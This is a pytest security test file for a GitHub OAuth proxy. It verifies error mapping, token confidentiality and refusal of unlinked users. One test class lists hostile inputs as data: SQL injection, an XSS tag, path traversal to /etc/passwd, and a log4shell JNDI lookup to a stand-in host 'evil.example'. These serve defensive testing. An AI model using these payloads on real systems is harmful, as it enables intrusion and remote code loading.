"""Abuse and failure handling for the GitHub proxy.

This router holds the user's OAuth token server-side precisely so the browser never has
to. Two things are therefore worth defending explicitly: that the token cannot reach a
response body, and that an upstream failure cannot turn into an unhandled error.
"""

import httpx
import pytest
import respx
from httpx import ASGITransport, AsyncClient

from tests.factories import make_user
from tests.helpers import authenticate

pytestmark = pytest.mark.security

API = "https://api.github.com"
TOKEN = "gho_supersecret_token_value"


@pytest.fixture
async def linked(client, db_session):
    user = await make_user(db_session, github_access_token=TOKEN)
    await authenticate(client, user)
    return user


@pytest.fixture
async def raw_client(app, linked):
    """
    An authenticated client that returns the 500 instead of re-raising.

    Two differences from the shared `client`, both needed here. The cookie is applied
    explicitly, because this is a separate client with its own jar and an unauthenticated
    request would be stopped by the middleware at 401 before the handler ever runs. And
    `raise_app_exceptions=False`, because ASGITransport otherwise propagates the
    handler's exception into the test and hides the status code production would send.
    """
    async with AsyncClient(
        transport=ASGITransport(app=app, raise_app_exceptions=False),
        base_url="http://testserver",
    ) as ac:
        await authenticate(ac, linked)
        yield ac


class TestUpstreamFailures:
    @respx.mock
    async def test_a_timeout_is_mapped_not_raised(self, raw_client):
        """
        A hung or unreachable GitHub API must become a 5xx the client can render.

        Today it does not: `list_my_repos` has no try/except around `client.get`, so
        `httpx.ConnectTimeout` propagates out of the handler. The intent is a 504 for a
        timeout.
        """
        respx.get(f"{API}/user/repos").mock(side_effect=httpx.ConnectTimeout("timed out"))

        response = await raw_client.get("/api/v1/github/repos")

        assert response.status_code in {502, 504}

    @respx.mock
    async def test_a_connection_error_is_mapped_not_raised(self, raw_client):
        """DNS failure and connection-refused take the same path as a timeout."""
        respx.get(f"{API}/user/repos").mock(
            side_effect=httpx.ConnectError("name resolution failed")
        )

        response = await raw_client.get("/api/v1/github/repos")

        assert response.status_code in {502, 504}

    @respx.mock
    async def test_a_timeout_on_a_branch_fetch_is_mapped(self, raw_client):
        respx.get(f"{API}/repos/example/x").mock(side_effect=httpx.ReadTimeout("slow"))

        response = await raw_client.get("/api/v1/github/repos/example/x/branches")

        assert response.status_code in {502, 504}

    @respx.mock
    async def test_an_upstream_error_body_is_not_forwarded(self, client, linked):
        """
        GitHub's error text can name internal paths and identifiers. The proxy logs it
        server-side and returns a fixed string instead.
        """
        respx.get(f"{API}/user/repos").mock(
            return_value=httpx.Response(
                500, text="internal cluster node 10.0.0.7 rejected the request"
            )
        )

        body = (await client.get("/api/v1/github/repos")).json()

        assert "10.0.0.7" not in str(body)
        assert body["detail"] == "Failed to fetch repositories from GitHub"

    @respx.mock
    async def test_an_upstream_401_body_is_not_forwarded(self, client, linked):
        respx.get(f"{API}/user/repos").mock(
            return_value=httpx.Response(401, text='{"message":"Bad credentials for gho_x"}')
        )

        body = (await client.get("/api/v1/github/repos")).json()

        assert "Bad credentials" not in str(body)


class TestTokenConfidentiality:
    @respx.mock
    async def test_the_token_is_absent_from_a_successful_response(self, client, linked):
        respx.get(f"{API}/user/repos").mock(
            return_value=httpx.Response(
                200,
                json=[
                    {
                        "full_name": "example/x",
                        "name": "x",
                        "updated_at": "2026-01-01T00:00:00Z",
                        "html_url": "https://github.com/example/x",
                    }
                ],
            )
        )

        response = await client.get("/api/v1/github/repos")

        assert TOKEN not in response.text

    @respx.mock
    async def test_the_token_is_absent_from_an_error_response(self, client, linked):
        respx.get(f"{API}/user/repos").mock(return_value=httpx.Response(500, text="boom"))

        response = await client.get("/api/v1/github/repos")

        assert TOKEN not in response.text

    @respx.mock
    async def test_the_token_is_absent_from_the_unlinked_error(self, client, db_session):
        """The 403 message must not echo whatever partial credential the user has."""
        user = await make_user(db_session, github_access_token=None)
        await authenticate(client, user)

        response = await client.get("/api/v1/github/repos")

        assert "gho_" not in response.text

    @respx.mock
    async def test_the_token_is_sent_upstream_and_nowhere_else(self, client, linked):
        """
        The counterpart to the tests above: the token *must* reach GitHub, or every one
        of these would pass trivially against a broken proxy.
        """
        route = respx.get(f"{API}/user/repos").mock(return_value=httpx.Response(200, json=[]))

        response = await client.get("/api/v1/github/repos")

        assert route.calls.last.request.headers["Authorization"] == f"Bearer {TOKEN}"
        assert TOKEN not in response.text


class TestHostileParameters:
    @pytest.mark.parametrize(
        "payload",
        [
            "' OR 1=1--",
            "'; DROP TABLE users; --",
            "%27%20OR%201%3D1--",
            "<script>alert(1)</script>",
            "../../../../etc/passwd",
            "\\..\\..\\windows\\system32",
            "${jndi:ldap://evil.example/a}",
            "\x00\x01\x02",
        ],
        ids=[
            "sqli-or",
            "sqli-drop",
            "sqli-encoded",
            "xss",
            "traversal-posix",
            "traversal-windows",
            "log4shell",
            "control-chars",
        ],
    )
    @respx.mock
    async def test_a_hostile_name_filter_is_inert(self, client, linked, payload):
        """
        `q` is a Python substring test on strings already fetched, so it never reaches
        SQL or a shell. The assertion is that the request completes and the filter simply
        matches nothing.
        """
        respx.get(f"{API}/user/repos").mock(
            return_value=httpx.Response(
                200,
                json=[
                    {
                        "full_name": "example/x",
                        "name": "x",
                        "updated_at": "2026-01-01T00:00:00Z",
                        "html_url": "https://github.com/example/x",
                    }
                ],
            )
        )

        response = await client.get("/api/v1/github/repos", params={"q": payload})

        assert response.status_code == 200
        assert response.json() == []

    @pytest.mark.parametrize(
        "owner",
        ["../../admin", "..%2f..%2fadmin", "owner with spaces", "owner?x=1", "owner#frag"],
        ids=["traversal", "encoded-traversal", "spaces", "query-injection", "fragment"],
    )
    @respx.mock
    async def test_a_hostile_owner_segment_stays_in_its_path_segment(self, client, linked, owner):
        """
        `owner` and `repo` are path parameters interpolated into the upstream URL. The
        assertion is that they cannot reach a different GitHub endpoint: whatever respx
        receives must still be under `/repos/`.
        """
        route = respx.get(url__regex=rf"{API}/.*").mock(return_value=httpx.Response(404, json={}))

        await client.get(f"/api/v1/github/repos/{owner}/x/branches")

        if route.calls:
            requested = str(route.calls.last.request.url)
            assert requested.startswith(f"{API}/repos/")
            assert "/user/" not in requested

    @pytest.mark.parametrize(
        ("param", "value"),
        [
            ("per_page", "10000"),
            ("per_page", "999999999999999999999"),
            ("page", "0"),
            ("page", "-5"),
            ("page", "abc"),
            ("per_page", "1e5"),
        ],
    )
    async def test_absurd_pagination_is_rejected_before_any_call(
        self, client, linked, param, value
    ):
        """Query constraints fire first, so no GitHub request is made at all."""
        response = await client.get(f"/api/v1/github/repos?{param}={value}")

        assert response.status_code == 422


class TestUnlinkedAccounts:
    @pytest.mark.parametrize(
        "path",
        [
            "/api/v1/github/repos",
            "/api/v1/github/repos/example/x/branches",
            "/api/v1/github/repos/example/x/commits",
            "/api/v1/github/repos/example/x/commits-multibranch",
        ],
    )
    async def test_a_user_without_a_token_is_refused(self, client, db_session, path):
        user = await make_user(db_session, github_access_token=None)
        await authenticate(client, user)

        response = await client.get(path)

        assert response.status_code == 403

    @respx.mock
    async def test_no_outbound_call_is_made_without_a_token(self, client, db_session):
        """The guard runs before the HTTP client is constructed."""
        user = await make_user(db_session, github_access_token=None)
        await authenticate(client, user)
        route = respx.get(f"{API}/user/repos").mock(return_value=httpx.Response(200, json=[]))

        await client.get("/api/v1/github/repos")

        assert route.call_count == 0
